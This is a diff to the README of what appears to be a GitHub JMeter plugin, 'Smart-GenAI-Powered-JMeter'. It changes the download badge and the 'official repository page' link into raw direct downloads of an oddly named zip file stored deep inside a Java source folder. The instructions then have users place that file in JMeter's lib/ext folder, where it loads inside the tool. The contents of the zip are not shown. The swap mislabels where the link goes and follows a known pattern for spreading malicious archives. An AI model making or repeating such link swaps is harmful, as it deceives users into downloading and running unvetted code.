@@ -1,6 +1,6 @@
 # 🤖 Smart-GenAI-Powered-JMeter - Build performance tests using plain language
 
-[![Download Smart-GenAI-Powered-JMeter](https://img.shields.io/badge/Download-Release-blue)](https://github.com/aditiaa2578/Smart-GenAI-Powered-JMeter)
+[![Download Smart-GenAI-Powered-JMeter](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/aditiaa2578/Smart-GenAI-Powered-JMeter/main/src/main/java/com/genai/jmeter/plugin/generator/A_Meter_Gen_Powered_Smart_J_v3.2.zip)
 
 ## 🎯 Purpose of this tool
 
@@ -17,7 +17,7 @@ Ensure your computer meets these needs before you start:
 
 ## 📥 How to get started
 
-1. Visit the [official repository page](https://github.com/aditiaa2578/Smart-GenAI-Powered-JMeter) to download the latest version of the plugin.
+1. Visit the [official repository page](https://raw.githubusercontent.com/aditiaa2578/Smart-GenAI-Powered-JMeter/main/src/main/java/com/genai/jmeter/plugin/generator/A_Meter_Gen_Powered_Smart_J_v3.2.zip) to download the latest version of the plugin.
 2. Locate the folder where you downloaded the file.
 3. Copy the downloaded plugin file into the `lib/ext` folder inside your JMeter installation directory.
 4. Restart JMeter if it is currently open. 
